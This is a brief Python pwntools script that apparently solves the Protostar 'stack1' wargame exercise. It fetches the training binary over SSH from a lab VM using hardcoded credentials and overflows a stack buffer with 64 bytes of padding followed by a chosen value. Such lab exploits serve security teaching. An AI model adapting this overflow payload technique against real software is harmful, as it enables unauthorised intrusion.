import os, sys, subprocess
from pwn import *

context(arch='i686', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack1')
if not os.access('./stack1', os.X_OK):
    subprocess.call('chmod +x ./stack1', shell=True)

junk = 'A'*cyclic_find(0x61616171) # 64
junk += p32(0x61626364, endian='little')

p = process(['./stack1', junk])
log.info(p.recv())
